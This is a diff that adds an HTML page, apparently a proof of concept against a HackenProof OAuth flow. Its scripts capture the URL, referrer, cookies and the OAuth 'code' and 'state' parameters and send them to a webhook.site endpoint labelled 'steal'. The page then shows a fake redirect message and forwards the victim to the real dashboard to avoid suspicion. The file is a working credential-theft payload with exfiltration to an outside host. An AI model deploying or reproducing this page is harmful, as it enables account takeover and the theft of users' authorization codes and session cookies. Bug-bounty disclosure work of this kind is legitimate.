@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+
+<body>
+<script>
+    // Capture the full URL and any parameters (like OAuth codes or tokens)
+    const fullUrl = window.location.href;
+    const referrer = document.referrer;
+    
+    // Send captured data to a free logging service (e.g., webhook.site)
+    // REPLACE 'https://webhook.site/c2862964-a890-47e0-b623-e4c0aea90095' with your actual unique URL from webhook.site
+    fetch('https://YOUR-WEBHOOK-URL', {
+        method: 'POST',
+        mode: 'no-cors',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({
+            url: fullUrl,
+            referrer: referrer,
+            cookies: document.cookie
+        })
+    });
+</script>
+
+<html>
+<head>
+    <title>Processing...</title>
+    <script>
+        // Capture OAuth code from URL
+        const urlParams = new URLSearchParams(window.location.search);
+        const oauthCode = urlParams.get('code');
+        const state = urlParams.get('state');
+        
+        if (oauthCode) {
+            // Send captured code to attacker's logging server
+            fetch('https://webhook.site/c2862964-a890-47e0-b623-e4c0aea90095/steal?code=' + oauthCode + '&state=' + state + '&referer=' + encodeURIComponent(document.referrer));
+            
+            // Redirect to legitimate site to avoid suspicion
+            document.write('<h1>Redirecting to dashboard...</h1>');
+            setTimeout(() => {
+                window.location.href = 'https://dashboard.hackenproof.com/dashboard';
+            }, 2000);
+        } else {
+            // If no code, redirect to login
+            window.location.href = 'https://dashboard.hackenproof.com/login';
+        }
+    </script>
+</head>
+<body>
+    <h1>Loading...</h1>
+</body>
+</html>
